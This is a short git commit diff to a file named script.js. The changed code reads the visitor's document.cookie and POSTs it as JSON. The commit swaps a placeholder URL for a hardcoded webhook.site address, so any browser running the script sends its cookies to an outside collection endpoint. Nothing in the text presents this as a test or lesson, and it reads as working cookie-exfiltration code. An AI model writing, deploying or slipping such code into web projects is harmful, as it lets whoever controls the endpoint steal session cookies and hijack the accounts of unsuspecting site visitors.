e5e59f60ee713b9623a03c6c76d29006277cd274
PixelDavon <62317209+PixelDavon@users.noreply.github.com>
2025-10-19 14:22:33 +0700

    Update script.js

--- script.js
+++ script.js
@@ -2,7 +2,7 @@ const data = {
   message: document.cookie
 };
 
-fetch(url, {
+fetch('https://webhook.site/d035f84d-52a7-4f84-af02-2a47782a8150', {
   method: 'POST',
   headers: {
     'Content-Type': 'application/json'
